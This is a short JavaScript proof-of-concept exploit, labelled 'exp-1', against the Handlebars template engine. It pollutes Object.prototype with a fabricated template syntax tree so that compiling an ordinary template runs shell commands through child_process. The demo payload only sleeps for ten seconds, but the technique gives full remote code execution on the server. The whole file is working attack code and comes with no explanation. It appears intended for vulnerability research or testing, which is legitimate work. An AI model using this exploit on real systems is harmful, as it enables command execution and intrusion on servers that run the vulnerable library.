const hbs = require('handlebars');

// exp-1
Object.prototype.type = 'Program';
Object.prototype.body = [{
    "type": "MustacheStatement",
    "path": 0,
    "params": [{
        "type": "NumberLiteral",
        "value": "console.log(process.mainModule.require('child_process').execSync('sleep 10').toString())"
    }],
    "loc": {
        "start": 0,
        "end": 0
    }
}];

const source = `Hello {{ msg }}`;
const template =  hbs.compile(source);

template({msg:"World!"})